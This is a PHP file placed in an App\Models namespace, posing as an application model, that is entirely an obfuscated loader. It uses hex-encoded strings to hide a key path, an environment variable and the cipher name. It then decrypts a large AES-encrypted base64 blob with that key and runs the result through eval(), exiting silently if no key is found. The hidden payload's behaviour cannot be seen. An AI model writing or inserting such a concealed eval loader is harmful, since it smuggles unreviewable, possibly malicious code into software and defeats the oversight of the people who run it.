<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('YyJwdmLUvI/i1Z3vNsQW8Q==');

$c=base64_decode(

'uz0jAIQlR3Ssom4zNLc+RKJtjbzNl2hpdW1ooU7gWQUImPb/A7Y9zpcdrYxyLIqImbseouYKhE7K' .
'4c0iBbS4q+BGjdLkHcYlva/C3o8mGpkS9oww9svW8D1WqjF6nxy2JWD0mrUzybjtA2+k0XhK73R4' .
'UEregAoUAirsZYxfHQZIAIJrVscQEP3VQWO3wk0g85c1gefHdRHDDo2ae5QniUjONkaYc/xpVke3' .
'Y0a1vEHcpvo/q03P5wFpWMyYi49N1cO4CYIYuufD2ZpatySeFhcrf87/AImo2I3PcNyH5xiOIwe/' .
'9y6/jGjRM1A/xoEtQVdkW9ZBqoPJo37CdQgKq1Y3opg7mx9JT0uBikZ6A4GSaPTPiLHLYHbzCch8' .
'oaq3O+JoEVadyFFQwS2BY9HbGhg0KTVeJOO4142evfK3f3e3HHKx9dqxGA6WoV0HfSDgh3J3PaJY' .
'WuLsid4/mSFN3FJmSzf6UZQ4kkA6c7+14RbSM+KxFQh5aoyGrWKxNRfrZOY/DCruRiwkyJBwEOoh' .
'hnUgh3mUIyOuWku6sxDt7KQLYljvFE+9pTExDmaAWUplQmKLIEIb+ZlrD0OlLr5RnyS9Di5gsX/V' .
'IyhuWDU14EWUboJwbDHOy0gViberaUGkD9/aNTP0ii73k/souO1FUl39Mz25tCnIoacwoMOt3RkO' .
'AGLilEOdjBDnygZIjc1wrHaFGSzsBw6iRAv03CexbvPOdfDVc6PM7zZ58oJXBDgKg19p4iROl2sh' .
'9CjCq4kgZaoE/YCkeIY1Y+WMSLNyYjGMRmgKfyFSBeLXlNSp69hQjYWvG0WAfULOtNcc+18QOohZ' .
'3rOLkd/GtX6rjcxXHzglezuceHbMBYQPHXnlyNjhHQB1ETUA6WBKeYCtpOAN0IRQhlsMJ4qAV/FW' .
'wagtYMrvQKYpYmF6pqp3i4XuG6cqRtF+cnLX6N3cIPuz/z46Pe6kYCTFITQorGnj+FaGj4D+yqwh' .
'fidRJs+o8fzvEHnDKi5rcM33qgyzUc5VWppkCjnPYZSOxDkAFYQrCppXniHpfrR8y+o00usxlN/N' .
'2cEkCr9EI9TMN5RqfXDg46JECyZrKOPlzlpfOmDZAHum4ry37/f1R7XYumtQw7TaqSSkNqIuZVqv' .
'QY8t63EXMdFOs+GRUi5Aeun6Re8ZpBzgMADjOw34g7bUeQD/edxbAFpSidwGKAC6vsz6tCH8SjVq' .
'13vZsD7UP6fz/UDSJQFTaQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

